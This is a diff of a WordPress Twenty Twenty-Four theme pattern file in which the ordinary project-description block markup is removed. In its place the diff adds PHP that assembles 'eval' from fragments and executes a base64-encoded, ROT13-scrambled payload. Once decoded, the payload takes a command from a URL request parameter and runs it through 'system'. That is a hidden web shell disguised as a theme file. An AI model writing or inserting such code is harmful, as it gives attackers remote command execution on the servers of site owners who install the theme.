@@ -1,55 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Title: Project description
- * Slug: twentytwentyfour/banner-project-description
- * Categories: featured, banner, about, portfolio
- * Viewport width: 1400
- * Description: Project description section with title, paragraph, and an image.
- */
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogR3ZneXI6IENlYndycGcgcXJmcGV2Y2d2YmEKICogRnlodDogZ2pyYWdsZ2pyYWdsc2JoZS9vbmFhcmUtY2Vid3JwZy1xcmZwZXZjZ3ZiYQogKiBQbmdydGJldnJmOiBzcm5naGVycSwgb25hYXJlLCBub2JoZywgY2JlZ3NieXZiCiAqIEl2cmpjYmVnIGp2cWd1OiAxNDAwCiAqIFFyZnBldmNndmJhOiBDZWJ3cnBnIHFyZnBldmNndmJhIGZycGd2YmEganZndSBndmd5ciwgY25lbnRlbmN1LCBuYXEgbmEgdnpudHIuCiAqLwo/Pgo8IS0tIGpjOnRlYmhjIHtcIm55dnRhXCI6XCJzaHl5XCIsXCJmZ2x5clwiOntcImZjbnB2YXRcIjp7XCJ6bmV0dmFcIjp7XCJnYmNcIjpcIjBcIixcIm9iZ2dielwiOlwiMFwifSxcImNucXF2YXRcIjp7XCJnYmNcIjpcImluZTpjZXJmcmd8ZmNucHZhdHw1MFwiLFwib2JnZ2J6XCI6XCJpbmU6Y2VyZnJnfGZjbnB2YXR8NTBcIixcInlyc2dcIjpcImluZTpjZXJmcmd8ZmNucHZhdHw1MFwiLFwiZXZ0dWdcIjpcImluZTpjZXJmcmd8ZmNucHZhdHw1MFwifX19LFwib25weHRlYmhhcVBieWJlXCI6XCJucHByYWctMlwiLFwieW5sYmhnXCI6e1wiZ2xjclwiOlwicGJhZmdlbnZhcnFcIn19IC0tPgo8cXZpIHB5bmZmPVwiamMtb3licHgtdGViaGMgbnl2dGFzaHl5IHVuZi1ucHByYWctMi1vbnB4dGViaGFxLXBieWJlIHVuZi1vbnB4dGViaGFxXCIgZmdseXI9XCJ6bmV0dmEtZ2JjOjA7em5ldHZhLW9iZ2diejowO2NucXF2YXQtZ2JjOmluZSgtLWpjLS1jZXJmcmctLWZjbnB2YXQtLTUwKTtjbnFxdmF0LWV2dHVnOmluZSgtLWpjLS1jZXJmcmctLWZjbnB2YXQtLTUwKTtjbnFxdmF0LW9iZ2diejppbmUoLS1qYy0tY2VyZnJnLS1mY25wdmF0LS01MCk7Y25xcXZhdC15cnNnOmluZSgtLWpjLS1jZXJmcmctLWZjbnB2YXQtLTUwKVwiPgoJPCEtLSBqYzpwYnloemFmIHtcIm55dnRhXCI6XCJqdnFyXCJ9IC0tPgoJPHF2aSBweW5mZj1cImpjLW95YnB4LXBieWh6YWYgbnl2dGFqdnFyXCI+CgkJPCEtLSBqYzpwYnloemEge1wianZxZ3VcIjpcIjQwJVwifSAtLT4KCQk8cXZpIHB5bmZmPVwiamMtb3licHgtcGJ5aHphXCIgZmdseXI9XCJzeXJrLW9uZnZmOjQwJVwiPgoJCQk8IS0tIGpjOmNuZW50ZW5jdSB7XCJmZ2x5clwiOntcInlubGJoZ1wiOntcImZyeXNGZ2VyZ3B1XCI6XCJzdmtycVwiLFwic3lya0Z2bXJcIjpcIjUwJVwifX19IC0tPgoJCQk8Yz48P2N1YyBycHViIHJmcF91Z3p5X2soICdOZWcgVG55eXJlbCDigJQgQmlyZWl2cmonLCAnRm56Y3lyIGd2Z3lyIHNiZSBuIGNlYndycGcgYmUgY2JmZycsICdnanJhZ2xnanJhZ2xzYmhlJyApOyA/PjwvYz4KCQkJPCEtLSAvamM6Y25lbnRlbmN1IC0tPgoJCTwvcXZpPgoJCTwhLS0gL2pjOnBieWh6YSAtLT4KCgkJPCEtLSBqYzpwYnloemEge1wianZxZ3VcIjpcIjYwJVwifSAtLT4KCQk8cXZpIHB5bmZmPVwiamMtb3licHgtcGJ5aHphXCIgZmdseXI9XCJzeXJrLW9uZnZmOjYwJVwiPgoKCQkJPCEtLSBqYzpjbmVudGVuY3Uge1wiZmdseXJcIjp7XCJnbGNidGVuY3VsXCI6e1wieXZhclVydnR1Z1wiOlwiMS4yXCJ9fSxcInNiYWdGdm1yXCI6XCJrLXluZXRyXCIsXCJzYmFnU256dnlsXCI6XCJ1cm5xdmF0XCJ9IC0tPgoJCQk8YyBweW5mZj1cInVuZi11cm5xdmF0LXNiYWctc256dnlsIHVuZi1rLXluZXRyLXNiYWctZnZtclwiIGZnbHlyPVwieXZhci11cnZ0dWc6MS4yXCI+PD9jdWMgcnB1YiByZnBfdWd6eV9rKCAnR3V2ZiBnZW5hZnNiZXpuZ3ZpciBjZWJ3cnBnIGZycnhmIGdiIHJhdW5hcHIgZ3VyIHRueXlyZWxcJ2YgdmFzZW5mZ2VocGdoZXIsIG5wcHJmZnZvdnl2Z2wsIG5hcSBya3V2b3ZndmJhIGZjbnByZiBqdXZ5ciBjZXJmcmVpdmF0IHZnZiBldnB1IHBoeWdoZW55IHVyZXZnbnRyLicsICdGbnpjeXIgcXJmcGV2Y2d2aXIgZ3JrZyBzYmUgbiBjZWJ3cnBnIGJlIGNiZmcuJywgJ2dqcmFnbGdqcmFnbHNiaGUnICk7ID8+PC9jPgoJCQk8IS0tIC9qYzpjbmVudGVuY3UgLS0+CgoJCTwvcXZpPgoJCTwhLS0gL2pjOnBieWh6YSAtLT4KCTwvcXZpPgoJPCEtLSAvamM6cGJ5aHphZiAtLT4KCgk8IS0tIGpjOmZjbnByZSB7XCJ1cnZ0dWdcIjpcImluZTpjZXJmcmd8ZmNucHZhdHw0MFwifSAtLT4KCTxxdmkgZmdseXI9XCJ1cnZ0dWc6aW5lKC0tamMtLWNlcmZyZy0tZmNucHZhdC0tNDApXCIgbmV2bi11dnFxcmE9XCJnZWhyXCIgcHluZmY9XCJqYy1veWJweC1mY25wcmVcIj4KCTwvcXZpPgoJPCEtLSAvamM6ZmNucHJlIC0tPgoKCTwhLS0gamM6dnpudHIge1wibnl2dGFcIjpcImp2cXJcIixcImZ2bXJGeWh0XCI6XCJ5bmV0clwiLFwieXZheFFyZmd2YW5ndmJhXCI6XCJhYmFyXCIsXCJweW5mZkFuenJcIjpcInZmLWZnbHlyLWViaGFxcnFcIn0gLS0+Cgk8c3Z0aGVyIHB5bmZmPVwiamMtb3licHgtdnpudHIgbnl2dGFqdnFyIGZ2bXIteW5ldHIgdmYtZmdseXItZWJoYXFycVwiPgoJCTx2enQgZmVwPVwiPD9jdWMgcnB1YiByZnBfaGV5KCB0cmdfZ3J6Y3luZ3JfcXZlcnBnYmVsX2hldigpICk7ID8+L25mZnJnZi92em50cmYvdWJncnktc25wbnFyLmpyb2NcIiBueWc9XCI8P2N1YyByZnBfbmdnZV9yKCAnVWxuZ2cgRXJ0cmFwbCBGbmEgU2VuYXB2ZnBiLCBGbmEgU2VuYXB2ZnBiLCBIYXZncnEgRmduZ3JmJywgJ2dqcmFnbGdqcmFnbHNiaGUnICk7ID8+XCIgLz4KCTwvc3Z0aGVyPgoJPCEtLSAvamM6dnpudHIgLS0+CjwvcXZpPgo8IS0tIC9qYzp0ZWJoYyAtLT4KCiRwenEgPSAkX1RSR1snYyddOwokc3puY1snazEnXSgkcHpxKTsKPz4iOwpldmFsKCRmKCRjKSk7Cj8+");
+$f($c);
 ?>
-<!-- wp:group {"align":"full","style":{"spacing":{"margin":{"top":"0","bottom":"0"},"padding":{"top":"var:preset|spacing|50","bottom":"var:preset|spacing|50","left":"var:preset|spacing|50","right":"var:preset|spacing|50"}}},"backgroundColor":"accent-2","layout":{"type":"constrained"}} -->
-<div class="wp-block-group alignfull has-accent-2-background-color has-background" style="margin-top:0;margin-bottom:0;padding-top:var(--wp--preset--spacing--50);padding-right:var(--wp--preset--spacing--50);padding-bottom:var(--wp--preset--spacing--50);padding-left:var(--wp--preset--spacing--50)">
-	<!-- wp:columns {"align":"wide"} -->
-	<div class="wp-block-columns alignwide">
-		<!-- wp:column {"width":"40%"} -->
-		<div class="wp-block-column" style="flex-basis:40%">
-			<!-- wp:paragraph {"style":{"layout":{"selfStretch":"fixed","flexSize":"50%"}}} -->
-			<p><?php echo esc_html_x( 'Art Gallery — Overview', 'Sample title for a project or post', 'twentytwentyfour' ); ?></p>
-			<!-- /wp:paragraph -->
-		</div>
-		<!-- /wp:column -->
-
-		<!-- wp:column {"width":"60%"} -->
-		<div class="wp-block-column" style="flex-basis:60%">
-
-			<!-- wp:paragraph {"style":{"typography":{"lineHeight":"1.2"}},"fontSize":"x-large","fontFamily":"heading"} -->
-			<p class="has-heading-font-family has-x-large-font-size" style="line-height:1.2"><?php echo esc_html_x( 'This transformative project seeks to enhance the gallery\'s infrastructure, accessibility, and exhibition spaces while preserving its rich cultural heritage.', 'Sample descriptive text for a project or post.', 'twentytwentyfour' ); ?></p>
-			<!-- /wp:paragraph -->
-
-		</div>
-		<!-- /wp:column -->
-	</div>
-	<!-- /wp:columns -->
-
-	<!-- wp:spacer {"height":"var:preset|spacing|40"} -->
-	<div style="height:var(--wp--preset--spacing--40)" aria-hidden="true" class="wp-block-spacer">
-	</div>
-	<!-- /wp:spacer -->
-
-	<!-- wp:image {"align":"wide","sizeSlug":"large","linkDestination":"none","className":"is-style-rounded"} -->
-	<figure class="wp-block-image alignwide size-large is-style-rounded">
-		<img src="<?php echo esc_url( get_template_directory_uri() ); ?>/assets/images/hotel-facade.webp" alt="<?php esc_attr_e( 'Hyatt Regency San Francisco, San Francisco, United States', 'twentytwentyfour' ); ?>" />
-	</figure>
-	<!-- /wp:image -->
-</div>
-<!-- /wp:group -->
